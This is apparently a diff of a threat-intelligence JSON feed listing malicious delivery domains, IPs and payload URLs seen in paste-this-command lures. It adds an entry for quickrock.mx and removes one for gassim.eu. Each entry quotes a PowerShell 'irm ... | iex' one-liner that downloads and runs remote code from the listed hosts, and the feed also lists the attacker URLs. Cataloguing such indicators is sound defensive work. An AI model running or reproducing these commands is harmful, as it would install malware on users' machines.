@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "quickrock.mx",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/a1472443e5d356fc",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927357",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/a1472443e5d356fc'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/a1472443e5d356fc"
+    ],
+    "ReportId": "cmwwml14703ja0oml9rr46nl1",
+    "ScannedAt": "2026-11-25T21:18:15.069000+00:00"
+  },
+  {
     "UrlDomain": "heelyscanada.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -4144,24 +4170,5 @@
     ],
     "ReportId": "cmwpm6bi223d10omlcv3e8omg",
     "ScannedAt": "2026-11-20T23:32:25.482000+00:00"
-  },
-  {
-    "UrlDomain": "gassim.eu",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/bc80cbabe7050d7d"
-    ],
-    "IP": [
-      "217.160.0.21"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/bc80cbabe7050d7d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/bc80cbabe7050d7d"
-    ],
-    "ReportId": "cmwphkd1n233y0omlg0rtb6wr",
-    "ScannedAt": "2026-11-20T21:23:22.585000+00:00"
   }
 ]
